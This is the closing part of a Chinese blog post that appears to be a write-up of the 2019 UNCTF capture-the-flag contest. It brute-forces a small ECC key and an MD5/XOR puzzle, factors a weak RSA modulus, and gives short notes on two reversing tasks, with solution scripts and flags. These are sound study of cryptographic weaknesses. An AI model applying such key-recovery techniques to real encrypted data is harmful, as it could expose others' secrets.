class="string">"4b98921c9b772ed5971c9eca38b08c9f"</span></span><br><span class="line">        , <span class="string">"81773872cbbd24dd8df2b980a2b47340"</span></span><br><span class="line">        , <span class="string">"73b131aa8e4847d27a1c20608199814e"</span></span><br><span class="line">        , <span class="string">"bbd7c4e20e99f0a3bf21c148fe22f21d"</span></span><br><span class="line">        , <span class="string">"bf268d46ef91eea2634c34db64c91ef2"</span></span><br><span class="line">        , <span class="string">"0862deb943decbddb87dbf0eec3a06cc"</span></span><br><span class="line">        , <span class="string">"7a59d932e8184ae963c40a759cc38fec"</span>]</span><br><span class="line">s = <span class="string">'0123456789abcdef'</span></span><br><span class="line">flag = <span class="string">'flag&#123;this_is_a_fake_flag_ahhhhh&#125;'</span></span><br><span class="line">ou = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">                <span class="keyword">for</span> z <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">                    tmp = s[i] + s[j] + s[k] + s[z]</span><br><span class="line">                    tt = hex(int(tmp.encode(<span class="string">'hex'</span>),<span class="number">16</span>)^int(flag[l*<span class="number">4</span>:l*<span class="number">4</span>+<span class="number">4</span>].encode(<span class="string">'hex'</span>),<span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">8</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">                    <span class="keyword">if</span> hashlib.md5(tt).hexdigest()== a[l]:</span><br><span class="line">                        ou += tmp</span><br><span class="line">print(ou)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 'bd1d6ba7f1d3f5a13ebb0a75844cccfa'</span></span><br></pre></td></tr></table></figure>



<h3 id="666"><a href="#666" class="headerlink" title="666"></a>666</h3><h4 id="描述-13"><a href="#描述-13" class="headerlink" title="描述"></a>描述</h4><p><a href="https://xpro-adl.91ctf.com/userdownload?filename=1910255db2c8fcb4fde.zip&amp;type=attach&amp;feature=custom" target="_blank" rel="noopener">https://xpro-adl.91ctf.com/userdownload?filename=1910255db2c8fcb4fde.zip&amp;type=attach&amp;feature=custom</a></p>
<h4 id="解决-13"><a href="#解决-13" class="headerlink" title="解决"></a>解决</h4><p>这个没什么好说的，逆向签到题</p>
<p>简单的逆回去。</p>
<h3 id="BabyXor"><a href="#BabyXor" class="headerlink" title="BabyXor"></a>BabyXor</h3><h4 id="描述-14"><a href="#描述-14" class="headerlink" title="描述"></a>描述</h4><p>答案提交flag{}括号内的值。</p>
<h4 id="解决-14"><a href="#解决-14" class="headerlink" title="解决"></a>解决</h4><p>输入没有任何作用，可知flag就在里面，OD动态调试一波。</p>
<p>flag有3段，慢慢看就好。（结合IDA，看函数地址可以加快过程）</p>
<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="ECC和AES基础"><a href="#ECC和AES基础" class="headerlink" title="ECC和AES基础"></a>ECC和AES基础</h3><h4 id="描述-15"><a href="#描述-15" class="headerlink" title="描述"></a>描述</h4><p>unctf_ECC和AES基础 请到<a href="http://132.232.125.125" target="_blank" rel="noopener">http://132.232.125.125</a> POST flag=你的flag</p>
<h4 id="解决-15"><a href="#解决-15" class="headerlink" title="解决"></a>解决</h4><p>题目逻辑很简单，flag被aes加密，但是aes的密钥不知道。</p>
<p>aes密钥被ECC加密的。ECC公钥已知，由于素数不大，所以直接爆破私钥（而且也只有这个办法，要不然不可能解密的。当然如果知道key是一个很小的数字，直接跳过ECC，直接AES密钥爆破也行。）</p>
<p>ECC解密：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">E=EllipticCurve(GF(15424654874903),[16546484,4548674875])</span><br><span class="line">G=E(6478678675, 5636379357093)</span><br><span class="line">K=(2854873820564,9226233541419)</span><br><span class="line">k = 2</span><br><span class="line">c = k*G</span><br><span class="line">while c[0] != K[0]:</span><br><span class="line">    c += G</span><br><span class="line">    k += 1</span><br><span class="line">#k = 2019813</span><br><span class="line">print(k*G)</span><br><span class="line">c1 = E(6860981508506,1381088636252)</span><br><span class="line">c2 = E(1935961385155,8353060610242)</span><br><span class="line">m = c1 - k*c2</span><br><span class="line">print(m)</span><br><span class="line">#(2854873820564 : 9226233541419 : 1)</span><br><span class="line">#(1026 : 7441725552408 : 1)</span><br></pre></td></tr></table></figure>



<p>aes解密：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = bytes(<span class="string">'1026'</span>.ljust(<span class="number">16</span>,<span class="string">' '</span>))</span><br><span class="line">aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line"><span class="comment"># encrypt</span></span><br><span class="line">plain_text = bytes(<span class="string">'this_is_a_flag'</span>.ljust(<span class="number">16</span>,<span class="string">' '</span>))</span><br><span class="line">text_enc = aes.encrypt(plain_text)</span><br><span class="line">text_enc_b64 = base64.b64encode(text_enc)</span><br><span class="line">print(text_enc_b64)</span><br><span class="line">c = <span class="string">'/cM8Nx+iAidmt6RiqX8Vww=='</span></span><br><span class="line">flag = aes.decrypt(base64.b64decode(c))</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#output:/cM8Nx+iAidmt6RiqX8Vww==</span></span><br><span class="line"><span class="comment">#this_is_a_flag</span></span><br></pre></td></tr></table></figure>

<p>然后按照描述操作。</p>
<h3 id="simple-rsa"><a href="#simple-rsa" class="headerlink" title="simple_rsa"></a>simple_rsa</h3><h4 id="描述-16"><a href="#描述-16" class="headerlink" title="描述"></a>描述</h4><p><a href="https://xpro-adl.91ctf.com/userdownload?filename=1910255db2c8d60a1b4.zip&amp;type=attach&amp;feature=custom" target="_blank" rel="noopener">https://xpro-adl.91ctf.com/userdownload?filename=1910255db2c8d60a1b4.zip&amp;type=attach&amp;feature=custom</a></p>
<h4 id="解决-16"><a href="#解决-16" class="headerlink" title="解决"></a>解决</h4><p>就是一个简单的rsa，但是要去猜测n的组成。</p>
<p>n很大，如果要解这个题，肯定是有小素数。</p>
<p>通过<code>PollardRho_p_1</code>算法求出小素数。</p>
<p>发现有7个<code>1043705605371301</code>.</p>
<p>本来还想继续去分解，但是想到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=&apos;XXXXXXXXXX&apos;</span><br></pre></td></tr></table></figure>

<p>flag应该不大，所以那<code>1043705605371301</code>的7次方应该就够了。主要它的欧拉值和e互素就一定能解。幸运的是，满足以上要求。直接RSA解密即可。</p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag='XXXXXXXXXX'</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">n=<span class="number">3464115689260819392935656139231271022088014497600959975252672820761470484618617542699739764705620767566046150296286140279466041905437740736319886548924058066340624280173573039937440574809212831672936265975209972857747738693288788052694888593629820783280181774594890101819911390468376042288685444703477639361249422054925155575158181408046447773183467474182159096249846479461475003039637685547191529769071424947165685996675043741359728960138725130116665515880652680244470002603320184043266997163009799067135481330853926800023087208636366543210276325733789567957712475079676808820490428973148590780103404729397985019089646026534758042652163974037179260930147000267787012874887703048185189387666199961350969478997330352491403611551096779887936063702892671572230523920277869824082318417366635732798078805070773662305098133013800559413976855639167085996705265872418286939474978058429877355305699191892248323534097124680592084808397263288943661630283254265898940430505371463275516870915261799702701453110383723660477322192658118815861974573497885759332587457883589126213868868281682733732394640188383458580555618181208722172011645063817887462511925363883111475043389367021569982583145912277082528397480756465818166640691294267829613428532584923122279261412957652411789780285394451850006055483598427256129336822790446219260722224551892755568723667049099823707012236618539013908897459508493477299241358343681962043777720375898238069411747593247677719659288861028038609681592049271388766040068274682329498410270047730060645409396168652996740411436504098243588534151795927613112273405281530700440843961363083171583053608594479571127638861391879160062136043924515492933057094406001740725150570943724333872057035272515676895138632004436149126542560186729495087753846670118167613304943153665660470977150177815354160112481310498255965933157902965011317272734556307544837058247794721427834401390455487872367113056168812990496943458920406382650794656884209032284257748450399719067686010156664485086500184078244358783696803659745365860507822269113477617988541658390715640119076036723560146145256418191555730429</span></span><br><span class="line"><span class="comment"># m=bytes_to_long(flag)</span></span><br><span class="line"><span class="comment"># c=pow(m,e,n)</span></span><br><span class="line"><span class="comment"># print(c)</span></span><br><span class="line">c =<span class="number">1348180992713820685594359831085361247035354818267759694375727771380213764105201303900290589048476671838784929302557807429509301123621642066527762448168417430350203900517746161928291953862336621873868684964993481406952303460424386080800907869577832154132021624995347121475139439850224598911049824567475034545196149320206620924509546294914370633958171840525667753751028800452370972967842349036965813468093121305475860652163573748880159896028384459277781803606279654121781761535513864212749202340439422384362197321739535686506006254445152569135807838677803047115947240251817017395748631234023225248868640103807357800695487118067385969130665294711887439861169737031598274672286881054564295019370600398079829687943670066246766386800967129670975899437309257181151390273864539453238400821713398980792443187238155205199387468000884390778225928491109565539772444103430764411852162036780535068932010631521096301305200494731040799554079996593223419379540630567412342494359961515157700054387356888773321804429041668331430841954949061238002355270616266853430676140296078177898764114420743905073496118755793091902224563802923183897542996809393707165837427396760691616506592877656939455806776333105152244073459704842848097376929745632888315642056267589901527329593161439752243318158600747713335265681764274061086952626629147275106502354039293870614872849851780761537660716667003562253735923584765118319171207551032289722689929226947535724389015974764265109970513715649126340709399701638880824570967389428525179746112494690443526404899052482884526335312491500994658519105204100875596292743155076199283666094556235485722975240358390560161706163569618302627055238860096406627340558428533728688904747040262153892623865784320600845613247625784683300197845026108394831724602330903266980995146046956218083954561639114586880305451066793209385702886944430548686040360906088479432852330611586273784509957389880104225534635731572089138568407411433675077699382999593384336070450058824669351046095205147266720901917218217564113964074957585348227506587531149811564371155522575778721899999227020238022970334707476977210019</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PollardRho_p_1</span><span class="params">(Q,N)</span>:</span></span><br><span class="line">    a = i = <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        a = pow(a, i, N)</span><br><span class="line">        d = gcd(a - <span class="number">1</span>, N)</span><br><span class="line">        <span class="keyword">if</span> d != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"><span class="comment"># print(PollardRho_p_1(1,n))</span></span><br><span class="line">p = <span class="number">1043705605371301</span></span><br><span class="line">n1 = p**<span class="number">7</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(p**<span class="number">6</span>)</span><br><span class="line">d = invert(e,phi)</span><br><span class="line">c = c % n1</span><br><span class="line">print(hex(pow(c,d,n1))[<span class="number">2</span>:].decode(<span class="string">'hex'</span>))</span><br><span class="line"><span class="comment">#flag&#123;G0oDJ0b_S0_SimPle_ChaMd5&#125;</span></span><br></pre></td></tr></table></figure>


        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    最后更新时间：<time datetime="2019-10-29T11:10:37.645Z" itemprop="dateUpdated">2019-10-29 19:10:37</time>
</span><br>


        
        这里可以写作者留言，标签和 hexo 中所有变量及辅助函数等均可调用，示例：<a href="/2019/10/28/UNCTFWP/" target="_blank" rel="external">http://localhost:4000/2019/10/28/UNCTFWP/</a>
        
    </div>
    
    <footer>
        <a href="http://localhost:4000">
            <img src="/img/ddd428.png" alt="hgh">
            hgh
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://localhost:4000/2019/10/28/UNCTFWP/&title=《UNCTF高校联合招新赛-竞技赛》 — hghhgghhg&pic=http://localhost:4000/img/ddd428.png" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://localhost:4000/2019/10/28/UNCTFWP/&title=《UNCTF高校联合招新赛-竞技赛》 — hghhgghhg&source=hghhgghhg blog" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/2019/10/28/UNCTFWP/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《UNCTF高校联合招新赛-竞技赛》 — hghhgghhg&url=http://localhost:4000/2019/10/28/UNCTFWP/&via=http://localhost:4000" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://localhost:4000/2019/10/28/UNCTFWP/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
  

  
    <div class="waves-block waves-effect next">
      <a href="/2019/09/21/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B--%E5%86%B3%E8%B5%9B/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">浙江省第二届大学生网络与信息安全竞赛--决赛</h4>
      </a>
    </div>
  
</nav>



    




















</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
        </p>
    </div>
    <div class="bottom">
        <p><span>hgh &copy; 2015 - 2019</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://localhost:4000/2019/10/28/UNCTFWP/&title=《UNCTF高校联合招新赛-竞技赛》 — hghhgghhg&pic=http://localhost:4000/img/ddd428.png" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://localhost:4000/2019/10/28/UNCTFWP/&title=《UNCTF高校联合招新赛-竞技赛》 — hghhgghhg&source=hghhgghhg blog" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/2019/10/28/UNCTFWP/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《UNCTF高校联合招新赛-竞技赛》 — hghhgghhg&url=http://localhost:4000/2019/10/28/UNCTFWP/&via=http://localhost:4000" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://localhost:4000/2019/10/28/UNCTFWP/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://localhost:4000/2019/10/28/UNCTFWP/" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



<script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = 'Come here!!!';
            clearTimeout(titleTime);
        } else {
            document.title = 'Welcome to hgh's blog';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>



</body>
</html>
